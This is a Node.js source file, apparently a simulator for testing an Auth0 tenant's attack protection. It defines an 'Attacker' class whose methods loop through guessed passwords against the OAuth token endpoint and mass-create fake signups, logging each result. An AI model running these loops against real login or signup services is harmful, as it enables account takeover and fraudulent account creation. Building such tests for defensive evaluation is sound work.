const axios = require('axios')
const chalk = require('chalk')

class Attacker {
  constructor ({ connection, tenant, client }) {
    this._connection = connection
    this._tenant = tenant
    this._client = client
  }

  get connection () { return this._connection }
  get tenant () { return this._tenant }
  get client () { return this._client }
  get URL () { return `https://${process.env.AUTH0_DOMAIN}` }

  async attemptLogin (email, password) {
    try {
      // SEE docs on "realm support"
      // https://auth0.com/docs/get-started/authentication-and-authorization-flow/call-your-api-using-resource-owner-password-flow#configure-realm-support
      const params = new URLSearchParams()
      params.append('username', email)
      params.append('password', password)
      params.append('realm', this.connection.name)
      params.append('client_id', this.client.client_id)
      params.append('grant_type', 'http://auth0.com/oauth/grant-type/password-realm')
      params.append('scope', 'profile')

      const headers = {
        'content-type': 'application/x-www-form-urlencoded'
      }
      const response = await axios.post(`${this.URL}/oauth/token`, params, { headers })

      return response.status
    } catch (error) {
      // console.log(error.message)
      return error.response?.status
    }
  }

  async attemptSignup (email, password) {
    try {
      const body = {
        email,
        password,
        connection: this.connection.name
      }
      const response = await axios.post(`${this.URL}/dbconnections/signup`, body)
      return response.status;
    } catch (error) {
      return error.response.status
    }
  }

  async credentialStuffing ({ email, attempts }) {
    for (let i = 0; i < attempts; i++) {
      const password = `P@ssw0rd${i}!`
      const status = await this.attemptLogin(email, password)
      console.log(`attempt #${i + 1} - email= ${chalk.blueBright(email)}, PW= ${chalk.blueBright(password)}: ${this.prettifyResponse(status)}`)
    }
  }

  async fraudulentSignups ({ count }) {
    for (let i = 0; i < count; i++) {
      const email = `fraud.user${i + 1}@auth0.com`
      const password = `P@ssw0rd!`
      const status = await this.attemptSignup(email, password)
      console.log(`attempt #${i + 1} - email= ${chalk.blueBright(email)}, PW= ${chalk.blueBright(password)}: ${this.prettifyResponse(status)}`)
    }
  }

  prettifyResponse (status) {
    let colorized = chalk.black.bgYellow('UNKNOWN');
    if (status > 399 && status < 500) {
      colorized = chalk.black.bgRed('FAILURE');
    } else if (status === 200) {
      colorized = chalk.black.bgGreen('SUCCESS');
    }
    return `[${status}] ${colorized}`
  }
}

module.exports = Attacker